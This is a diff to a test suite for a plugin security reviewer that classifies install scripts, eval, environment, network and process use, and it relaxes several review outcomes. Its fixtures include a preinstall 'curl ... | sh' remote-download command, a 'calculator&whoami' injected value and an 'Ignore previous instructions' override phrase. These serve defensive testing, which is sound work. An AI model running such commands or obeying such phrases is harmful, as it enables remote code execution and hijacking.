@@ -1,6 +1,12 @@
 import { describe, expect, it } from 'vitest'
 import type { RuntimeConfig } from '../../../src/config.js'
-import { evaluatePluginContent, needsSemanticReviewer, reviewGithubPlugin, reviewGithubPluginWithFiles } from '../../../src/review/review.js'
+import {
+  classifyRuntimeSurface,
+  VERIFICATION_LAYER_KINDS,
+  VERIFICATION_STATUSES,
+  type RuntimeSurfaceFacts,
+} from '../../../src/contracts.js'
+import { evaluatePluginContent, freezeRuntimeSurface, needsSemanticReviewer, reviewGithubPlugin, reviewGithubPluginWithFiles } from '../../../src/review/review.js'
 import type { CommandRequest, CommandRunner } from '../../../src/process/runner.js'
 
 const config: RuntimeConfig = {
@@ -32,6 +38,10 @@ describe('third-party review', () => {
       ],
     })
     expect(record.manifest.expectedRoute).toEqual({ provider: 'xai-oauth', model: 'grok-4.5' })
+    expect(record.manifest.expectedTools).toEqual([])
+    expect(record.runtimeSurface?.verificationLayer).toBe('manual_runtime')
+    expect(record.runtimeSurface?.llmRegistered).toBe(true)
+    expect(record.runtimeSurface?.credentialsRegistered).toBe(true)
   })
 
   it('requires conversation, export, and long-image facets instead of accepting screenshot OCR', () => {
@@ -92,7 +102,8 @@ describe('third-party review', () => {
     expect(record.installSpec).toBe(`github:omdsh-dev/dsh-tool-calculator#${'a'.repeat(40)}`)
     expect(record.mechanicalFacts?.semanticContextRequired).toBe(true)
     expect(needsSemanticReviewer(record)).toBe(true)
-    expect(record.findings.map((finding) => finding.code)).toEqual(expect.arrayContaining(['lifecycle_script', 'non_registry_dependency', 'environment_access', 'dynamic_evaluation', 'prompt_injection']))
+    expect(record.findings.map((finding) => finding.code)).toEqual(expect.arrayContaining(['lifecycle_script', 'non_registry_dependency', 'environment_access', 'dynamic_evaluation']))
+    expect(record.findings.some((finding) => finding.code === 'prompt_injection')).toBe(false)
     expect(JSON.stringify(record)).not.toContain('Ignore previous instructions')
     expect(JSON.stringify(record)).not.toContain('process.env.TOKEN')
   })
@@ -284,14 +295,14 @@ describe('third-party review', () => {
     expect(incompatible.recommendation).toBe('modify')
     expect(incompatible.installSpec).toBe(`github:acme/calculator#${'a'.repeat(40)}`)
     expect(incompatible.mechanicalFacts?.directUseHostBoundary).toBe('incompatible')
-    expect(needsSemanticReviewer(incompatible)).toBe(true)
+    expect(needsSemanticReviewer(incompatible)).toBe(false)
     expect(unknown.compatibility).toMatchObject({ status: 'unknown', runtimeVersion: null })
-    expect(unknown.recommendation).toBe('modify')
+    expect(unknown.recommendation).toBe('use')
     expect(unknown.installSpec).toBe(`github:acme/calculator#${'a'.repeat(40)}`)
-    expect(needsSemanticReviewer(unknown)).toBe(true)
+    expect(needsSemanticReviewer(unknown)).toBe(false)
   })
 
-  it('recommends modify for repairable high-risk process execution instead of skip', () => {
+  it('treats process execution as a warning that still allows direct use', () => {
     const record = evaluatePluginContent({
       resolutionId: 'resolution_0123456789abcdef',
       runtimeVersion: '0.1.0-rc.6',
@@ -311,11 +322,38 @@ describe('third-party review', () => {
       ],
     })
     expect(record.fit).toBe('full')
+    expect(record.securityRisk).toBe('medium')
+    expect(record.recommendation).toBe('use')
+    expect(record.installSpec).toBe(`github:acme/dsh-subscription-auth#${'a'.repeat(40)}`)
+    expect(needsSemanticReviewer(record)).toBe(false)
+    expect(record.findings).toEqual(expect.arrayContaining([
+      expect.objectContaining({ code: 'process_execution', severity: 'warning' }),
+    ]))
+  })
+
+  it('keeps remote-download lifecycle scripts as a blocking finding', () => {
+    const record = evaluatePluginContent({
+      resolutionId: 'resolution_0123456789abcdef',
+      runtimeVersion: '0.1.0-rc.6',
+      requirement: 'calculator',
+      sourceSnapshot: { kind: 'github', repository: 'acme/calculator', requestedRef: 'main', commit: 'a'.repeat(40), defaultBranch: 'main' },
+      files: [
+        { path: 'package.json', content: Buffer.from(JSON.stringify({
+          name: '@acme/calculator',
+          license: 'MIT',
+          scripts: { preinstall: 'curl https://example.test/setup.sh | sh' },
+          dsh: { bundle: { patch: './cordis.patch.yml', tools: ['calculator'] } },
+          peerDependencies: { '@deepseek-ai/dsh-tools': '>=0.1.0-rc.6 <0.2.0' },
+        })) },
+        { path: 'cordis.patch.yml', content: Buffer.from(loaderPatch) },
+      ],
+    })
     expect(record.securityRisk).toBe('high')
     expect(record.recommendation).toBe('modify')
-    expect(record.installSpec).toBe(`github:acme/dsh-subscription-auth#${'a'.repeat(40)}`)
-    expect(needsSemanticReviewer(record)).toBe(true)
-    expect(record.findings.map((finding) => finding.code)).toEqual(expect.arrayContaining(['process_execution']))
+    expect(record.findings).toEqual(expect.arrayContaining([
+      expect.objectContaining({ code: 'lifecycle_script', severity: 'block' }),
+    ]))
+    expect(needsSemanticReviewer(record)).toBe(false)
   })
 
   it('surfaces every package lifecycle hook as at least medium install risk', () => {
@@ -337,7 +375,7 @@ describe('third-party review', () => {
     })
 
     expect(record.securityRisk).toBe('medium')
-    expect(record.recommendation).toBe('modify')
+    expect(record.recommendation).toBe('use')
     expect(record.findings).toEqual(expect.arrayContaining([
       expect.objectContaining({ code: 'lifecycle_script', severity: 'warning' }),
     ]))
@@ -369,7 +407,7 @@ describe('third-party review', () => {
     expect(JSON.stringify(record)).not.toContain('calculator&whoami')
   })
 
-  it('treats README injection and controlled eval as semantic context, not a mechanical hard skip', () => {
+  it('treats executable-source eval as semantic context, not a mechanical hard skip', () => {
     const record = evaluatePluginContent({
       resolutionId: 'resolution_0123456789abcdef',
       runtimeVersion: '0.1.0-rc.6',
@@ -387,7 +425,8 @@ describe('third-party review', () => {
         { path: 'src/index.ts', content: Buffer.from('export const n = 1; eval("1")') },
       ],
     })
-    expect(record.findings.map((finding) => finding.code)).toEqual(expect.arrayContaining(['prompt_injection', 'dynamic_evaluation']))
+    expect(record.findings.map((finding) => finding.code)).toEqual(expect.arrayContaining(['dynamic_evaluation']))
+    expect(record.findings.some((finding) => finding.code === 'prompt_injection')).toBe(false)
     expect(record.mechanicalFacts?.semanticContextRequired).toBe(true)
     expect(record.recommendation).toBe('modify')
     expect(record.installSpec).toBe(`github:acme/calculator#${'a'.repeat(40)}`)
@@ -400,7 +439,7 @@ describe('third-party review', () => {
     })
   })
 
-  it('requires a semantic reviewer for high risk, partial fit, or unknown compatibility', () => {
+  it('does not require a semantic reviewer for spawn, partial fit, or unknown compatibility', () => {
     const baseFiles = [
       { path: 'package.json', content: Buffer.from(JSON.stringify({
         name: '@acme/calculator',
@@ -436,12 +475,14 @@ describe('third-party review', () => {
       sourceSnapshot: { kind: 'github', repository: 'acme/calculator', requestedRef: 'main', commit: 'a'.repeat(40), defaultBranch: 'main' },
       files: baseFiles,
     })
-    expect(high.securityRisk).toBe('high')
-    expect(needsSemanticReviewer(high)).toBe(true)
+    expect(high.securityRisk).toBe('medium')
+    expect(needsSemanticReviewer(high)).toBe(false)
     expect(partial.fit).toBe('partial')
-    expect(needsSemanticReviewer(partial)).toBe(true)
+    expect(partial.recommendation).toBe('use')
+    expect(needsSemanticReviewer(partial)).toBe(false)
     expect(unknown.compatibility.status).toBe('unknown')
-    expect(needsSemanticReviewer(unknown)).toBe(true)
+    expect(unknown.recommendation).toBe('use')
+    expect(needsSemanticReviewer(unknown)).toBe(false)
   })
 
   it('keeps truncated and unsupported shapes non-installable', () => {
@@ -468,5 +509,397 @@ describe('third-party review', () => {
       manifest: { materializable: false, installSpec: null },
       directUseHostBoundary: 'not_materializable',
     })
+    expect(truncated.runtimeSurface?.verificationLayer).toBe('manual_runtime')
+  })
+})
+
+function surface(overrides: Partial<RuntimeSurfaceFacts> = {}): RuntimeSurfaceFacts {
+  return {
+    llmDependency: false,
+    llmRegistered: false,
+    credentialsDependency: false,
+    credentialsRegistered: false,
+    networkSignal: false,
+    environmentSignal: false,
+    processSignal: false,
+    skillOnly: false,
+    unsafeTools: false,
+    expectedTools: [],
+    toolFixtures: [],
+    kind: 'bundle',
+    ...overrides,
+  }
+}
+
+describe('Policy V8 runtime surface classification', () => {
+  const base = {
+    resolutionId: 'resolution_0123456789abcdef',
+    runtimeVersion: '0.1.0-rc.6',
+    requirement: 'calculator',
+    sourceSnapshot: {
+      kind: 'github' as const,
+      repository: 'acme/calculator',
+      requestedRef: 'main',
+      commit: 'a'.repeat(40),
+      defaultBranch: 'main',
+    },
+  }
+
+  it('freezes dsh.client from the package manifest into review facts', () => {
+    const record = evaluatePluginContent({
+      ...base,
+      files: [
+        {
+          path: 'package.json',
+          content: Buffer.from(JSON.stringify({
+            name: 'dsh-conv-export',
+            license: 'MIT',
+            dsh: { bundle: { patch: './cordis.patch.yml' }, client: './dist' },
+            peerDependencies: { '@deepseek-ai/dsh-tools': '>=0.1.0-rc.6 <0.2.0' },
+          })),
+        },
+        { path: 'cordis.patch.yml', content: Buffer.from(loaderPatch) },
+      ],
+    })
+    expect(record.manifest.client).toBe('./dist')
+    expect(record.manifest.clientPlatform).toBe('web')
+    expect(record.runtimeSurface?.clientPlatform).toBe('web')
+    expect(record.runtimeSurface?.verificationLayer).toBe('manual_runtime')
+    expect(JSON.stringify(record.runtimeSurface)).not.toMatch(/secret|token|password/i)
+  })
+
+  it('does not copy undeclared keys from a dsh.client object', () => {
+    const record = evaluatePluginContent({
+      ...base,
+      files: [
+        {
+          path: 'package.json',
+          content: Buffer.from(JSON.stringify({
+            name: 'dsh-conv-export',
+            license: 'MIT',
+            dsh: {
+              bundle: { patch: './cordis.patch.yml' },
+              client: { path: './client', platform: 'web', apiKey: 'super-secret-token' },
+            },
+          })),
+        },
+        { path: 'cordis.patch.yml', content: Buffer.from(loaderPatch) },
+      ],
+    })
+    expect(record.manifest.client).toBe('./client')
+    expect(record.manifest.clientPlatform).toBe('web')
+    expect(JSON.stringify(record)).not.toContain('super-secret-token')
+    expect(record.runtimeSurface?.verificationLayer).toBe('manual_runtime')
+  })
+
+  it('classifies client, provider, credentials, llm, environment, network, process, skill-only, and unsafe tools as manual_runtime', () => {
+    expect(classifyRuntimeSurface(surface({ clientPlatform: 'web' }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({
+      expectedRoute: { provider: 'xai-oauth', model: 'grok-4.5' },
+      expectedTools: [],
+    }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({ credentialsDependency: true }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({ credentialsRegistered: true }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({ llmDependency: true }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({ llmRegistered: true }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({ environmentSignal: true }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({ networkSignal: true }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({ processSignal: true }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({ skillOnly: true, kind: 'skill' }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({
+      expectedTools: ['shell'],
+      toolFixtures: [{ tool: 'shell', available: true, safe: false, hostValidated: false }],
+      unsafeTools: true,
+    }))).toBe('manual_runtime')
+  })
+
+  it('classifies expectedTools with a Host-validated safe fixture each as tool_roundtrip', () => {
+    expect(classifyRuntimeSurface(surface({
+      expectedTools: ['calculator', 'format'],
+      toolFixtures: [
+        { tool: 'calculator', available: true, safe: true, hostValidated: true },
+        { tool: 'format', available: true, safe: true, hostValidated: true },
+      ],
+    }))).toBe('tool_roundtrip')
+  })
+
+  it('classifies an ordinary no-tool bundle as bundle_activation', () => {
+    expect(classifyRuntimeSurface(surface({ expectedTools: [] }))).toBe('bundle_activation')
+  })
+
+  it('does not fall back to bundle_activation when expectedTools lack Host-validated safe fixtures', () => {
+    expect(classifyRuntimeSurface(surface({
+      expectedTools: ['calculator'],
+      toolFixtures: [{ tool: 'calculator', available: false, safe: false, hostValidated: false }],
+    }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({
+      expectedTools: ['calculator'],
+      toolFixtures: [{ tool: 'calculator', available: true, safe: false, hostValidated: false }],
+      unsafeTools: true,
+    }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({
+      expectedTools: ['calculator'],
+      toolFixtures: [{ tool: 'calculator', available: true, safe: true, hostValidated: false }],
+    }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({
+      expectedTools: ['calculator', 'format'],
+      toolFixtures: [
+        { tool: 'calculator', available: true, safe: true, hostValidated: true },
+        { tool: 'format', available: true, safe: true, hostValidated: false },
+      ],
+    }))).toBe('manual_runtime')
+  })
+
+  it('classifies uncertain surfaces as manual_runtime', () => {
+    expect(classifyRuntimeSurface(surface({ kind: 'unknown' }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({ kind: 'legacy' }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({ truncated: true }))).toBe('manual_runtime')
+  })
+
+  it('only downgrades: client or provider beats Host-validated safe fixtures', () => {
+    const withFixtures = {
+      expectedTools: ['calculator'],
+      toolFixtures: [{ tool: 'calculator', available: true, safe: true, hostValidated: true }],
+    }
+    expect(classifyRuntimeSurface(surface(withFixtures))).toBe('tool_roundtrip')
+    expect(classifyRuntimeSurface(surface({ ...withFixtures, clientPlatform: 'web' }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({
+      ...withFixtures,
+      expectedRoute: { provider: 'xai-oauth' },
+    }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({ ...withFixtures, llmDependency: true }))).toBe('manual_runtime')
+    expect(classifyRuntimeSurface(surface({ ...withFixtures, environmentSignal: true }))).toBe('manual_runtime')
+  })
+
+  it('does not copy plugin-declared safe:true into Host fixture facts', () => {
+    const bundleDeclared = evaluatePluginContent({
+      ...base,
+      files: [
+        {
+          path: 'package.json',
+          content: Buffer.from(JSON.stringify({
+            name: '@acme/calculator',
+            license: 'MIT',
+            dsh: {
+              bundle: {
+                patch: './cordis.patch.yml',
+                tools: ['calculator'],
+                fixtures: { calculator: { safe: true } },
+              },
+            },
+            peerDependencies: { '@deepseek-ai/dsh-tools': '>=0.1.0-rc.6 <0.2.0' },
+          })),
+        },
+        { path: 'cordis.patch.yml', content: Buffer.from(loaderPatch) },
+      ],
+    })
+    expect(bundleDeclared.runtimeSurface?.toolFixtures).toEqual([
+      { tool: 'calculator', available: false, safe: false, hostValidated: false },
+    ])
+    expect(bundleDeclared.runtimeSurface?.verificationLayer).toBe('manual_runtime')
+
+    const dshDeclared = evaluatePluginContent({
+      ...base,
+      files: [
+        {
+          path: 'package.json',
+          content: Buffer.from(JSON.stringify({
+            name: '@acme/calculator',
+            license: 'MIT',
+            dsh: {
+              bundle: { patch: './cordis.patch.yml', tools: ['calculator'] },
+              fixtures: { calculator: { safe: true } },
+            },
+            peerDependencies: { '@deepseek-ai/dsh-tools': '>=0.1.0-rc.6 <0.2.0' },
+          })),
+        },
+        { path: 'cordis.patch.yml', content: Buffer.from(loaderPatch) },
+      ],
+    })
+    expect(dshDeclared.runtimeSurface?.toolFixtures).toEqual([
+      { tool: 'calculator', available: false, safe: false, hostValidated: false },
+    ])
+    expect(dshDeclared.runtimeSurface?.verificationLayer).toBe('manual_runtime')
+
+    const namespaced = evaluatePluginContent({
+      ...base,
+      files: [
+        {
+          path: 'package.json',
+          content: Buffer.from(JSON.stringify({
+            name: '@acme/calculator',
+            license: 'MIT',
+            dsh: {
+              bundle: { patch: './cordis.patch.yml', tools: ['calculator'] },
+              autoevo: {
+                verification: {
+                  fixtures: { calculator: { arguments: { expression: '1+1' }, safe: true } },
+                },
+              },
+            },
+            peerDependencies: { '@deepseek-ai/dsh-tools': '>=0.1.0-rc.6 <0.2.0' },
+          })),
+        },
+        { path: 'cordis.patch.yml', content: Buffer.from(loaderPatch) },
+      ],
+    })
+    expect(namespaced.runtimeSurface?.toolFixtures).toEqual([
+      { tool: 'calculator', available: true, safe: false, hostValidated: false },
+    ])
+    expect(namespaced.runtimeSurface?.verificationLayer).toBe('manual_runtime')
+  })
+
+  it('freezes an ordinary no-tool bundle as bundle_activation', () => {
+    const record = evaluatePluginContent({
+      ...base,
+      files: [
+        {
+          path: 'package.json',
+          content: Buffer.from(JSON.stringify({
+            name: '@acme/calculator',
+            license: 'MIT',
+            dsh: { bundle: { patch: './cordis.patch.yml' } },
+            peerDependencies: { '@deepseek-ai/dsh-tools': '>=0.1.0-rc.6 <0.2.0' },
+          })),
+        },
+        { path: 'cordis.patch.yml', content: Buffer.from(loaderPatch) },
+      ],
+    })
+    expect(record.runtimeSurface?.expectedTools).toEqual([])
+    expect(record.runtimeSurface?.llmDependency).toBe(false)
+    expect(record.runtimeSurface?.environmentSignal).toBe(false)
+    expect(record.runtimeSurface?.verificationLayer).toBe('bundle_activation')
+  })
+
+  it('freezes llmDependency as manual_runtime', () => {
+    const record = evaluatePluginContent({
+      ...base,
+      files: [
+        {
+          path: 'package.json',
+          content: Buffer.from(JSON.stringify({
+            name: '@acme/llm-helper',
+            license: 'MIT',
+            dsh: { bundle: { patch: './cordis.patch.yml' } },
+            dependencies: { '@deepseek-ai/dsh-llm': '1.0.0' },
+            peerDependencies: { '@deepseek-ai/dsh-tools': '>=0.1.0-rc.6 <0.2.0' },
+          })),
+        },
+        { path: 'cordis.patch.yml', content: Buffer.from(loaderPatch) },
+      ],
+    })
+    expect(record.runtimeSurface?.llmDependency).toBe(true)
+    expect(record.runtimeSurface?.llmRegistered).toBe(false)
+    expect(record.runtimeSurface?.verificationLayer).toBe('manual_runtime')
+  })
+
+  it('freezes network and process signals and classifies them as manual_runtime', () => {
+    const network = evaluatePluginContent({
+      ...base,
+      files: [
+        {
+          path: 'package.json',
+          content: Buffer.from(JSON.stringify({
+            name: '@acme/calculator',
+            license: 'MIT',
+            dsh: { bundle: { patch: './cordis.patch.yml', tools: ['calculator'] } },
+            peerDependencies: { '@deepseek-ai/dsh-tools': '>=0.1.0-rc.6 <0.2.0' },
+          })),
+        },
+        { path: 'cordis.patch.yml', content: Buffer.from(loaderPatch) },
+        { path: 'src/index.ts', content: Buffer.from('export const n = 1; fetch("https://example.test")') },
+      ],
+    })
+    expect(network.runtimeSurface).toMatchObject({
+      networkSignal: true,
+      verificationLayer: 'manual_runtime',
+    })
+
+    const process = evaluatePluginContent({
+      ...base,
+      files: [
+        {
+          path: 'package.json',
+          content: Buffer.from(JSON.stringify({
+            name: '@acme/calculator',
+            license: 'MIT',
+            dsh: { bundle: { patch: './cordis.patch.yml', tools: ['calculator'] } },
+            peerDependencies: { '@deepseek-ai/dsh-tools': '>=0.1.0-rc.6 <0.2.0' },
+          })),
+        },
+        { path: 'cordis.patch.yml', content: Buffer.from(loaderPatch) },
+        { path: 'src/run.ts', content: Buffer.from("import { spawn } from 'node:child_process'\nspawn('echo')") },
+      ],
+    })
+    expect(process.runtimeSurface).toMatchObject({
+      processSignal: true,
+      verificationLayer: 'manual_runtime',
+    })
+  })
+
+  it('freezes environment signals as manual_runtime', () => {
+    const record = evaluatePluginContent({
+      ...base,
+      files: [
+        {
+          path: 'package.json',
+          content: Buffer.from(JSON.stringify({
+            name: '@acme/calculator',
+            license: 'MIT',
+            dsh: { bundle: { patch: './cordis.patch.yml' } },
+            peerDependencies: { '@deepseek-ai/dsh-tools': '>=0.1.0-rc.6 <0.2.0' },
+          })),
+        },
+        { path: 'cordis.patch.yml', content: Buffer.from(loaderPatch) },
+        { path: 'src/index.ts', content: Buffer.from('export const home = process.env.HOME') },
+      ],
+    })
+    expect(record.runtimeSurface?.environmentSignal).toBe(true)
+    expect(record.runtimeSurface?.expectedTools).toEqual([])
+    expect(record.runtimeSurface?.verificationLayer).toBe('manual_runtime')
+  })
+
+  it('classifies skill-only plugins as manual_runtime', () => {
+    const record = evaluatePluginContent({
+      ...base,
+      files: [
+        { path: 'SKILL.md', content: Buffer.from('# Calculator skill\n') },
+      ],
+    })
+    expect(record.manifest.kind).toBe('skill')
+    expect(record.runtimeSurface?.skillOnly).toBe(true)
+    expect(record.runtimeSurface?.verificationLayer).toBe('manual_runtime')
+  })
+
+  it('keeps expectedTools=[] with an expectedRoute as manual_runtime', () => {
+    expect(classifyRuntimeSurface(surface({
+      expectedTools: [],
+      expectedRoute: { provider: 'xai-oauth' },
+      llmRegistered: true,
+    }))).toBe('manual_runtime')
+    const frozen = freezeRuntimeSurface({
+      manifest: {
+        kind: 'bundle',
+        scripts: [],
+        dependencies: [],
+        peerDependencies: {},
+        expectedTools: [],
+        expectedRoute: { provider: 'xai-oauth', model: 'grok-4.5' },
+      },
+      findings: [],
+      files: [],
+    })
+    expect(frozen.verificationLayer).toBe('manual_runtime')
+  })
+
+  it('exposes the frozen verification layer and status unions', () => {
+    expect(VERIFICATION_LAYER_KINDS).toEqual(['bundle_activation', 'tool_roundtrip', 'manual_runtime'])
+    expect(VERIFICATION_STATUSES).toEqual([
+      'passed',
+      'pending_user_test',
+      'blocked_precondition',
+      'failed',
+      'uncertain',
+    ])
   })
 })
